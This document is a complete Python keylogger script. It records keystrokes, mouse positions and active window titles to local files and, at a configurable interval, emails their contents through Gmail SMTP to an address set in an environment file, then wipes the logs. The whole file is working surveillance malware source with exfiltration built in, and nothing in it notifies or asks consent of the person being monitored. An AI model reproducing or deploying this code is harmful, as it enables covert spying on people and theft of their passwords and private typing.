# pyright: reportUnboundVariable=false

import os
import time
import threading
import platform
import smtplib
from email.message import EmailMessage

# email config
from dotenv import load_dotenv

load_dotenv()


EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
TO_EMAIL = os.getenv("TO_EMAIL")

if EMAIL_ADDRESS is None or EMAIL_PASSWORD is None or TO_EMAIL is None:
    raise RuntimeError("Missing email configuration in .env file")

EMAIL_INTERVAL = int(os.getenv("EMAIL_INTERVAL", "60"))

# keybord setup
try:
    from pynput.keyboard import Key, Listener

    KEYBOARD_OK = True
except Exception as e:
    print(f"[!] Keyboard disabled: {e}")
    KEYBOARD_OK = False

# mouse setup
try:
    import pyautogui

    pyautogui.FAILSAFE = False
    MOUSE_OK = True
except Exception as e:
    print(f"[!] Mouse disabled: {e}")
    MOUSE_OK = False

# window setup
try:
    import pywinctl as pwc

    WINDOW_OK = True
except Exception as e:
    print(f"[!] Window tracking disabled: {e}")
    WINDOW_OK = False


# keyboard code
keys = []
count = 0


def write_keys(keys):
    with open("key_logs.txt", "a") as f:
        for key in keys:
            try:
                f.write(key.char)
            except AttributeError:
                f.write(f"[{key}]")


def on_press(key):
    global count
    keys.append(key)
    count += 1
    if count >= 10:
        write_keys(keys)
        keys.clear()
        count = 0


def on_release():
    pass


def start_keyboard():
    if not KEYBOARD_OK:
        return
    with Listener(on_press=on_press) as listener:
        listener.join()


# mouse code
def start_mouse():
    if not MOUSE_OK:
        return
    with open("mouse_log.txt", "a") as f:
        while True:
            x, y = pyautogui.position()
            f.write(f"{time.time():.2f},{x},{y}\n")
            f.flush()
            time.sleep(0.1)


# window code
def start_window():
    if not WINDOW_OK:
        return
    last_title = None
    with open("window_log.txt", "a") as f:
        while True:
            try:
                title = pwc.getActiveWindowTitle()
                if title and title != last_title:
                    f.write(f"{time.time():.2f} | {title}\n")
                    f.flush()
                    last_title = title
            except Exception:
                pass
            time.sleep(0.5)


# email code
def send_logs():
    msg = EmailMessage()
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = TO_EMAIL
    msg["Subject"] = "Activity Logs"

    body = ""

    for filename in ["key_logs.txt", "mouse_log.txt", "window_log.txt"]:
        if os.path.exists(filename):
            with open(filename, "r", errors="ignore") as f:
                content = f.read().strip()
                if content:
                    body += f"\n--- {filename} ---\n{content}\n"
            # clear file after sending
            open(filename, "w").close()

    if not body:
        return

    msg.set_content(body)

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)


def email_loop():
    while True:
        time.sleep(EMAIL_INTERVAL)
        try:
            send_logs()
        except Exception as e:
            print(f"[!] Email error: {e}")


# main code
if __name__ == "__main__":
    print(f"[*] OS: {platform.system()}")
    print("[*] Logger started (ESC or Ctrl+C to stop)")

    threads = []

    if KEYBOARD_OK:
        threads.append(threading.Thread(target=start_keyboard, daemon=True))
    if MOUSE_OK:
        threads.append(threading.Thread(target=start_mouse, daemon=True))
    if WINDOW_OK:
        threads.append(threading.Thread(target=start_window, daemon=True))

    threads.append(threading.Thread(target=email_loop, daemon=True))

    for t in threads:
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Exiting.")
